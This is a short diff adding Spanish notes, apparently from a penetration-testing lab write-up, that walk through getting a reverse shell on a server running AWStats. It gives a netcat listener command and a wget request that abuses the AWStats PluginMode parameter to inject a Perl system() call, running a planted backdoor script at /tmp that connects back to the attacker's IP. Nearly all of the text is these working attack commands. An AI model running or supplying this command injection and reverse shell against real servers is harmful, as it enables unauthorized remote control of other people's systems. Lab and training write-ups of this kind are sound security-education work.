@@ -1,0 +1,12 @@
+El backdoor fue instalado en el directorio /tmp
+
+En nuestra maquina atacante escuchamos en el puerto 80 por conecciones utilizando
+el comando de netcat
+
+nc -lvnp 80
+
+Luego ejecutamos el script del backdoor con nuestra direccion ip como destino para que
+el servidor victima abra la coneccion a nuestro puerto 80
+
+wget --no-proxy "10.0.8.5/awstats/awstats.pl?&amp;PluginMode=:print+system('perl /tmp/script.pl 10.0.8.4')+;"
+
